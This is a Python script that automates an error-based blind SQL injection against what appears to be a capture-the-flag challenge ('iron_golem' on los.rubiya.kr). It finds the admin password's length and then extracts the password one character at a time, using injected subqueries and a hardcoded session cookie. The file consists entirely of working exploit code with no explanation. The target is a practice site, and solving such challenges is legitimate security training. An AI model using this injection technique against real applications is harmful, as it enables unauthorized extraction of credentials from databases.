import requests
import string 
 
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?"
cookie = {'PHPSESSID':'h6l3pi7c0om563rq0eik9vrnf9'}
 
def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "pw=1' or id='admin' and if(length(pw)={},1,(select 1 union select 2))%23".format(pw_len)
        print(query)
        res = requests.get(url=url+query,cookies=cookie)
        if not 'Subquery' in res.text:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len
 
def hex_pw_char(pw_len):
    hex_passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "pw=' or id='admin' and (select 0 union select ascii(substr(pw,{},1)) > {}) %23".format(i,ord(j))
            print(query)
            res = requests.get(url=url+query,cookies=cookie)
            if not 'Subquery' in res.text:
                hex_passwd += j
                print("HEX PASSWORD CHAR : " + j)
                break
    print("HEX PASSWORD : " + hex_passwd)
 
if __name__ == "__main__":
    pw_len = pw_length()
    hex_pw_char(pw_len)
